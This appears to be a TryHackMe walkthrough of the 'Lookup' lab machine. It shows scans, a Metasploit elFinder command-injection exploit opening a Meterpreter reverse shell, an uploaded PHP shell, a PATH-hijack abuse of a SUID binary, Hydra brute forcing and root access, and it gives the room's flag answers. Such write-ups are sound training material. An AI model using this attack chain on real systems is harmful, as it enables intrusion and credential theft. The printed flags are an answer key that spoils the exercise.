# Lookup . TryHackMe Walkthrough . Enumeration


![](https://miro.medium.com/v2/resize:fit:1250/1*etcdU9zjyGqrot2zI0p68Q.png)


## Lookup

### Test your enumeration skills on this boot-to-root machine.

tryhackme.com



# 1. Lookup

L**ookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through “Lookup,” hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

**Note:** For free users, it is recommended to use your own VM if you’ll ever experience problems visualizing the site. Please allow 3–5 minutes for the VM to fully boot up.

_Answer the questions below_

**1.1.** What is the user flag?`38375fb4dd8baa2b2039ac03d92b820e`

**1.2.** What is the root flag?`5a285a9f257e45c68bb6c9f9f57d18e8`

**— — —** Below are images documenting my hands-on practice.

**Nmap:** ports 22 and 80 are open.

```
root@ip-[THM AttackBox]:~/lookup# **nmap -Pn --script vuln** [Target]  
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-23 19:45 GMT  
Pre-scan script results:  
| broadcast-avahi-dos:   
|   Discovered hosts:  
|     [Redacted]  
|   After NULL UDP avahi packet DoS (**CVE-2011-1002**).  
|_  Hosts are all up (not vulnerable).  
Nmap scan report for ip-[Target].eu-west-1.compute.internal ([Target])  
Host is up (0.00014s latency).  
Not shown: 998 closed ports  
PORT   STATE SERVICE  
22/tcp open  ssh  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
80/tcp open  http  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
|_http-csrf: Couldn't find any CSRF vulnerabilities.  
|_http-dombased-xss: Couldn't find any DOM based XSS.  
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.  
MAC Address: 02:4B:C0:11:EF:8B (Unknown)  
```
  
Nmap done: 1 IP address (1 host up) scanned in 56.78 seconds

Another type of **Nmap** just to practice.

```
root@ip-[THM AttackBox]:~/lookup# **nmap -sV --script vuln** [Target]  
Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-23 20:28 GMT  
Pre-scan script results:  
| broadcast-avahi-dos:   
|   **Discovered hosts**:  
|     **224.0.0.251**  
|   After NULL UDP avahi packet DoS (CVE-2011-1002).  
|_  Hosts are all up (not vulnerable).  
Nmap scan report for lookup.thm ([Target])  
Host is up (0.00013s latency).  
Not shown: 998 closed ports  
PORT   STATE SERVICE VERSION  
**22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)**  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
| vulners:   
|   cpe:/a:openbsd:openssh:8.2p1:   
|      CVE-2023-38408 9.8 https://vulners.com/cve/CVE-2023-38408  
...  
|_     PACKETSTORM:140261 0.0 https://vulners.com/packetstorm/PACKETSTORM:140261 *EXPLOIT*  
**80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))**  
|_clamav-exec: ERROR: Script execution failed (use -d to debug)  
|_http-csrf: Couldn't find any CSRF vulnerabilities.  
|_http-dombased-xss: Couldn't find any DOM based XSS.  
| http-enum:   
|_  **/login.php: Possible admin folder**  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.  
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)  
| vulners:   
```
```
|   cpe:/a:apache:http_server:2.4.41:   
|      C94CBDE1-4CC5-5C06-9D18-23CAB216705E 10.0 https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E *EXPLOIT*  
|      95499236-C9FE-56A6-9D7D-E943A24B633A 10.0 https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A *EXPLOIT*  
|      2C119FFA-ECE0-5E14-A4A4-354A2C38071A 10.0 https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A *EXPLOIT*  
|      PACKETSTORM:181114 9.8 https://vulners.com/packetstorm/PACKETSTORM:181114 *EXPLOIT*  
|      MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE- 9.8 https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE- *EXPLOIT*  
|      MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH- 9.8 https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-HTTP-APACHE_NORMALIZE_PATH- *EXPLOIT*  
...  
```
  
```
|      04E3583E-DFED-5D0D-BCF2-1C1230EB666D 4.3 https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D *EXPLOIT*  
|      PACKETSTORM:164501 0.0 https://vulners.com/packetstorm/PACKETSTORM:164501 *EXPLOIT*  
|_     PACKETSTORM:164418 0.0 https://vulners.com/packetstorm/PACKETSTORM:164418 *EXPLOIT*  
MAC Address: 02:4B:C0:11:EF:8B (Unknown)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
```
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 62.31 seconds

**Rustscan** also just to practice.

root@ip-[THM AttackBox]:~/lookup# rustscan -a [Target] --ulimit 50000 -- -sV   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.  
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'  
The Modern Day Port Scanner.  
________________________________________  
: https://discord.gg/GFrQsGy           :  
: https://github.com/RustScan/RustScan :  
 --------------------------------------  
Nmap? More like slowmap.\U0001f422  
  
```
[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"  
[~] Automatically increasing ulimit value to 50000.  
Open [Target]:22  
Open [Target]:80  
[~] Starting Script(s)  
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")  
  
Failed to resolve "-".  
Failed to resolve "-".  
Failed to resolve "-".  
[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-23 19:46 UTC  
NSE: Loaded 45 scripts for scanning.  
Initiating Ping Scan at 19:46  
Scanning [Target] [2 ports]  
Completed Ping Scan at 19:46, 0.00s elapsed (1 total hosts)  
Initiating Parallel DNS resolution of 1 host. at 19:46  
Completed Parallel DNS resolution of 1 host. at 19:46, 0.00s elapsed  
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]  
Initiating Connect Scan at 19:46  
Scanning ip-[Target].eu-west-1.compute.internal ([Target]) [2 ports]  
Discovered open port 80/tcp on [Target]  
Discovered open port 22/tcp on [Target]  
Completed Connect Scan at 19:46, 0.00s elapsed (2 total ports)  
...  
```
  
```
PORT   STATE SERVICE REASON  VERSION  
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Read data files from: /usr/bin/../share/nmap  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in **7.62** seconds

```
Edited **_/etc/hosts_**.

[Target]   lookup.thm

CVE-2011–1002

![](https://miro.medium.com/v2/resize:fit:875/1*nfG4oBHmSVVMay7L4yhDVA.png)

[https://nvd.nist.gov/vuln/detail/CVE-2011-1002](https://nvd.nist.gov/vuln/detail/CVE-2011-1002)

![](https://miro.medium.com/v2/resize:fit:875/1*dHTXoVurYjYNZR1YUTFacA.png)

[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1002)

Accessed **_http://lookup.thm:80_**.

![](https://miro.medium.com/v2/resize:fit:875/1*JoOw6sc4IpHnTnwk7jx3hQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*PDY1D8z_sxtlYYoO4h-Hfg.png)

![](https://miro.medium.com/v2/resize:fit:875/1*Pe3VKURzqDIP6EzrFJUY_Q.png)

![](https://miro.medium.com/v2/resize:fit:875/1*ZRLs43-Ii0831drgMREDPg.png)

**admin** is a valid username.

![](https://miro.medium.com/v2/resize:fit:875/1*PG9A4hNzrZCeedC5y6s5nw.png)

**atacker** is not a valid username**.** LoL

![](https://miro.medium.com/v2/resize:fit:875/1*-DycuUjev3iaY4PZJNP5Ag.png)

![](https://miro.medium.com/v2/resize:fit:875/1*Hs4vDxsUuBX2kZif-FhChw.png)

![](https://miro.medium.com/v2/resize:fit:875/1*YRg7oeBiOnu4zeNe6rbfUg.png)

Edited **_/etc/hosts_**.

[Target]   lookup.thm files.lookup.thm

Refreshed and got this.

![](https://miro.medium.com/v2/resize:fit:875/1*YYUmukRYXtPDb04ScI4AQw.png)

[http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw](http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw)

![](https://miro.medium.com/v2/resize:fit:875/1*rE3XktSRCJS1Jp_aHWXYQw.png)

[http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw](http://files.lookup.thm/elFinder/elfinder.html#elf_l1_Lw)

![](https://miro.medium.com/v2/resize:fit:875/1*mifZs_ah4ulBAFy47HCsAg.png)

credentials = think:nopassword

![](https://miro.medium.com/v2/resize:fit:875/1*PY0xtWNxCQ1xa4mXqnOtyQ.png)

permission denied.

root@ip-[THM AttackBox]:~/lookup# searchsploit elfinder  
----------------------------------------------------------------------------------------- ---------------------------------  
 Exploit Title                                                                           |  Path  
----------------------------------------------------------------------------------------- ---------------------------------  
elFinder 2 - Remote Command Execution (via File Creation)                                | php/webapps/36925.py  
elFinder 2.1.47 - 'PHP connector' Command Injection                                      | php/webapps/46481.py  
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)              | php/remote/46539.rb  
----------------------------------------------------------------------------------------- ---------------------------------  
Shellcodes: No Results

```
root@ip-[THM AttackBox]:~/lookup# msfupdate  
...  
root@ip-[THM AttackBox]:~/lookup# msfconsole  
...  
msf6 > search elfinder  
  
Matching Modules  
================  
  
   #  Name                                                               Disclosure Date  Rank       Check  Description  
   -  ----                                                               ---------------  ----       -----  -----------  
   0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution  
   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability  
   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution  
   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection  
   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection  
...  
msf6 use 4  
...  
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > show options  
...  
sf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set lhost tun0  
[-] The following options failed to validate: Value 'tun0' is not valid for option 'LHOST'.  
lhost => 10.10.113.24  
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS files.lookup.thm  
RHOSTS => files.lookup.thm  
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run  
...  
[*] Meterpreter session 1 opened ([THM AttackBox]:4444 -> [Target]:50940) at ....  
...  
meterpreter > ls -la  
```
Listing: /var/www/files.lookup.thm/public_html/elFinder/php  
===========================================================  
  
```
Mode              Size    Type  Last modified              Name  
----              ----    ----  -------------              ----  
040755/rwxr-xr-x  4096    dir   2024-11-23 21:42:34 +0000  .tmp  
100755/rwxr-xr-x  1167    fil   2024-04-02 13:30:58 +0100  MySQLStorage.sql  
100755/rwxr-xr-x  2598    fil   2024-04-02 13:30:58 +0100  autoload.php  
100755/rwxr-xr-x  7329    fil   2024-04-02 13:30:58 +0100  connector.minimal.php  
040755/rwxr-xr-x  4096    dir   2024-04-02 13:30:58 +0100  editors  
100755/rwxr-xr-x  167518  fil   2024-04-02 13:30:58 +0100  elFinder.class.php  
100755/rwxr-xr-x  12221   fil   2024-04-02 13:30:58 +0100  elFinderConnector.class.php  
100755/rwxr-xr-x  13126   fil   2024-04-02 13:30:58 +0100  elFinderFlysystemGoogleDriveNetmount.php  
100755/rwxr-xr-x  3331    fil   2024-04-02 13:30:58 +0100  elFinderPlugin.php  
100755/rwxr-xr-x  7767    fil   2024-04-02 13:30:58 +0100  elFinderSession.php  
100755/rwxr-xr-x  1094    fil   2024-04-02 13:30:58 +0100  elFinderSessionInterface.php  
100755/rwxr-xr-x  55445   fil   2024-04-02 13:30:58 +0100  elFinderVolumeBox.class.php  
100755/rwxr-xr-x  251064  fil   2024-04-02 13:30:58 +0100  elFinderVolumeDriver.class.php  
100755/rwxr-xr-x  41782   fil   2024-04-02 13:30:58 +0100  elFinderVolumeDropbox.class.php  
100755/rwxr-xr-x  44696   fil   2024-04-02 13:30:58 +0100  elFinderVolumeDropbox2.class.php  
100755/rwxr-xr-x  57466   fil   2024-04-02 13:30:58 +0100  elFinderVolumeFTP.class.php  
100755/rwxr-xr-x  68402   fil   2024-04-02 13:30:58 +0100  elFinderVolumeGoogleDrive.class.php  
100755/rwxr-xr-x  5371    fil   2024-04-02 13:30:58 +0100  elFinderVolumeGroup.class.php  
100755/rwxr-xr-x  44740   fil   2024-04-02 13:30:58 +0100  elFinderVolumeLocalFileSystem.class.php  
100755/rwxr-xr-x  28902   fil   2024-04-02 13:30:58 +0100  elFinderVolumeMySQL.class.php  
100755/rwxr-xr-x  61355   fil   2024-04-02 13:30:58 +0100  elFinderVolumeOneDrive.class.php  
100755/rwxr-xr-x  1583    fil   2024-04-02 13:30:58 +0100  elFinderVolumeTrash.class.php  
100755/rwxr-xr-x  1576    fil   2024-04-02 13:30:58 +0100  elFinderVolumeTrashMySQL.class.php  
040755/rwxr-xr-x  4096    dir   2024-04-02 13:30:58 +0100  libs  
100755/rwxr-xr-x  24832   fil   2024-04-02 13:30:58 +0100  mime.types  
040755/rwxr-xr-x  4096    dir   2023-07-30 14:41:59 +0100  plugins  
040755/rwxr-xr-x  4096    dir   2024-04-02 13:30:58 +0100  resources  
  
meterpreter > getuid  
Server username: www-data  
  
meterpreter > cd /home  
meterpreter > ls -la  
  
```
Listing: /home  
==============  
  
```
Mode              Size  Type  Last modified              Name  
----              ----  ----  -------------              ----  
040755/rwxr-xr-x  4096  dir   2024-01-11 20:29:34 +0000  think  
  
meterpreter > cd think  
meterpreter > ls -la  
```
Listing: /home/think  
====================  
  
```
Mode              Size  Type  Last modified              Name  
----              ----  ----  -------------              ----  
020666/rw-rw-rw-  0     cha   2024-11-23 19:41:30 +0000  .bash_history  
100755/rwxr-xr-x  220   fil   2023-06-02 11:51:34 +0100  .bash_logout  
100755/rwxr-xr-x  3771  fil   2023-06-02 11:51:34 +0100  .bashrc  
040755/rwxr-xr-x  4096  dir   2023-06-21 18:49:21 +0100  .cache  
040700/rwx------  4096  dir   2023-08-09 12:11:19 +0100  .gnupg  
100640/rw-r-----  525   fil   2023-07-30 20:45:53 +0100  .passwords  
100755/rwxr-xr-x  807   fil   2023-06-02 11:51:34 +0100  .profile  
040640/rw-r-----  4096  dir   2023-06-21 12:08:48 +0100  .ssh  
020666/rw-rw-rw-  0     cha   2024-11-23 19:41:30 +0000  .viminfo  
100640/rw-r-----  33    fil   2023-07-30 22:45:28 +0100  user.txt  
  
meterpreter > cat user.txt  
[-] core_channel_open: Operation failed: 1  
  
meterpreter > cd /var/www/files.lookup.thm/public_html/elFinder/php  

meterpreter > find / -perm -u=s -type f 2>/dev/null  
...  
/snap/core20/1974/usr/lib/openssh/ssh-keysign  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/sbin/pwm  
...
```

![](https://miro.medium.com/v2/resize:fit:875/1*UHXMaH-azCa3bfBEJR1Kpg.png)

![](https://miro.medium.com/v2/resize:fit:875/1*Ql5Ihms1Xykl439mz_UApQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*9sSuTWXoXSkXIU7xAqtyzw.png)

**Gobuster**

root@ip-[THM AttackBox]:~/lookup# gobuster dir -u 'http://files.lookup.thm/elFinder/' -w /usr/share/wordlists/dirb/common.txt -t 200  
===============================================================  
Gobuster v3.6  
```
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url: http://files.lookup.thm/elFinder/  
[+] Method: GET  
[+] Threads: 200  
[+] Wordlist: /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes: 404  
[+] User Agent: gobuster/3.6  
[+] Timeout: 10s  
```
===============================================================  
```
Starting gobuster in directory enumeration mode  
===============================================================  
/css (Status: 301) [Size: 327] [ → http://files.lookup.thm/elFinder/css/]  
/files (Status: 301) [Size: 329] [ → http://files.lookup.thm/elFinder/files/]  
/img (Status: 301) [Size: 327] [ → http://files.lookup.thm/elFinder/img/]  
/js (Status: 301) [Size: 326] [ → http://files.lookup.thm/elFinder/js/]  
/php (Status: 301) [Size: 327] [ → http://files.lookup.thm/elFinder/php/]  
/sounds (Status: 301) [Size: 330] [ → http://files.lookup.thm/elFinder/sounds/]  
/.hta (Status: 403) [Size: 281]  
/.htaccess (Status: 403) [Size: 281]  
/.htpasswd (Status: 403) [Size: 281]  
Progress: 4614 / 4615 (99.98%)  
===============================================================  
Finished  
===============================================================

```
![](https://miro.medium.com/v2/resize:fit:875/1*dHvFL1AFIwpLipFpaoIjsg.png)

[http://files.lookup.thm/elFinder/php/](http://files.lookup.thm/elFinder/php/)

![](https://miro.medium.com/v2/resize:fit:875/1*5ysHzyumnRkkpkeFBhud2w.png)

listener

![](https://miro.medium.com/v2/resize:fit:875/1*rckBRhw9muj4wxSm-vJhMg.png)

uploaded shell.php

![](https://miro.medium.com/v2/resize:fit:875/1*wYcbQOsw8R4TmzO4G8drmw.png)

My shell.php, own!!!

![](https://miro.medium.com/v2/resize:fit:875/1*biNV1Iv5iU-gMiY-gKg_DQ.png)

Aha!

```
$ id  
uid=33(www-data)gid=33(www-data) groups=(www-data)  
$ pwd  
/  
$ which python3  
/usr/bin/python3  
$ python3 -c "import pty;pty.spawn('/bin/bash')"  
www-data@lookup: export TERM=xterm  
www-data@lookup:/$  
...  
  
www-data@lookup:/home$ echo '#!/bin/bash' > /tmp/id  
echo '#!/bin/bash' > /tmp/id  
www-data@lookup:/home$ echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id  
uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id  
www-data@lookup:/home$ chmod +x /tmp/id  
chmod +x /tmp/id  
www-data@lookup:/home$ export PATH=/tmp:$PATH  
export PATH=/tmp:$PATH  
www-data@lookup:/home$ /usr/sbin/pwm  
/usr/sbin/pwm  
[!] Running 'id' command to extract the username and user ID (UID)  
[!] ID: think  
jose1006  
jose1004  
jose1002  
jose1001teles  
jose100190  
jose10001  
jose10.asd  
jose10+  
jose0_07  
jose0990  
jose0986$  
jose098130443  
jose0981  
jose0924  
jose0923  
jose0921  
thepassword  
jose(1993)  
jose'sbabygurl  
jose&vane  
jose&takie  
jose&samantha  
jose&pam  
jose&jlo  
jose&jessica  
jose&jessi  
josemario.AKA(think)  
jose.medina.  
jose.mar  
jose.luis.24.oct  
jose.line  
jose.leonardo100  
jose.leas.30  
jose.ivan  
jose.i22  
jose.hm  
jose.hater  
jose.fa  
jose.f  
jose.dont  
jose.d  
jose.com}  
jose.com  
jose.chepe_06  
jose.a91  
jose.a  
jose.96.  
jose.9298  
jose.2856171  
www-data@lookup:/home$

![](https://miro.medium.com/v2/resize:fit:875/1*lFeqODIIMBhmPRb9qtZLJA.png)

Hydra to find **think** password

![](https://miro.medium.com/v2/resize:fit:875/1*JD8wmNMnnfw2o9Vr7y8uwQ.png)

ssh **think**

![](https://miro.medium.com/v2/resize:fit:875/1*QvOyD2oqhzssl_o5Rt-SGQ.png)

user flag

![](https://miro.medium.com/v2/resize:fit:875/1*jA5YskNV2yVeERJrzgBQxQ.png)

ssh as root

```
# Room Complete

![](https://miro.medium.com/v2/resize:fit:875/1*sVaaTJoF_H6SiXYFutf9bw.png)

This image and all the theoretical content of the present article is TryHackMe´s property.

![](https://miro.medium.com/v2/resize:fit:875/1*NOefLw4xvzwwiMb7uZKmWA.png)

This image and all the theoretical content of the present article is TryHackMe´s property.

# My 201-day-streak on TryHackMe

201 days streak 🎉 ▪ 56,124 points ▪ 427 rooms completed ▪ 51 badges🎖️  
Global ranking: 1,185ᵗʰ all time ▪ 5,299ᵗʰ monthly  
Brazil ranking:    25ᵗʰ all time ▪    72ⁿᵈ monthly